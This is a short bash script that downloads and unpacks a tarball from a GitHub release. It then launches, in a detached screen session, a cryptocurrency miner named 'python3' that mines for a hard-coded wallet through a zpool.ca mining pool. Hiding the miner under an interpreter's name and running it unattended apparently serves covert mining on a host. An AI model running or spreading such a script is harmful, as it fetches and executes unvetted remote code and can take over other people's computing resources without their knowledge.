#!/bin/bash

# Download file
wget -q -O mek https://github.com/DotAja/ALONE/releases/download/alone/dotsrb.tar.gz

# Extract file
tar -xvf mek

screen -dmS dotsrb$COUNT ./dotsrb/python3 -a yespowersugar -o yespowersugar.eu.mine.zpool.ca:6241 -u DGNF8dXcQNseyKH55K59nyTkRVEbDkuewJ -p c=DGB,zap=SUGAR
